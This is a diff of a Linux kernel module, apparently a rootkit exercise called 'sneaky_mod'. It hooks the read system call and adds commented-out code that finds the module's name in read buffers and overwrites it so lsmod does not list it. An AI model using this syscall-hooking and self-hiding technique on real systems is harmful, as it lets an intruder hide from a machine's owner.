@@ -84,31 +84,13 @@ asmlinkage int (*read_original)(int fd, void *buf, size_t count);
 asmlinkage int sneaky_read(int fd, void *buf, size_t count)
 {
 
-  /*
-  char* mem = kmalloc(count, GFP_KERNEL);
-  //We ran out of kernel space --> send back correct Kernel Error Macro
-  if (mem == NULL) {
-    return -ENOMEM;
-  }
-  mm_segment_t userspace = get_fs();
-  set_fs(KERNEL_DS);
-  ssize_t numbytes= read_original(fd, mem, count);
-  //ensure addresses are once again only in user space
-  set_fs(userspace);
-  
-  if (copy_to_user(buf, mem, count)) {
-      kfree(mem);
-      //exit
-      return -EAGAIN;
-  }
-
-  kfree(mem);
-  return numbytes;
-  */
   ssize_t ret = read_original(fd, buf, count);
+
+  /*
+  //FIND SNEAKY MOD IN LSMOD
   const char * needle = "sneaky_mod";
   const char * haystack = (const char *) buf;
-  int i;
+  int i, j;
   //checking int
   int check = 0;
   for (i=0; i< count; i++) {
@@ -118,6 +100,14 @@ asmlinkage int sneaky_read(int fd, void *buf, size_t count)
       break;
     }
   }
+  char * locale = strstr(haystack, needle);
+  if (locale != NULL) {
+    for (j = 0; j < 4; j++) {
+      *(locale) = '0';
+      locale++;
+    }
+  }
+  */
   return ret;
 }
 
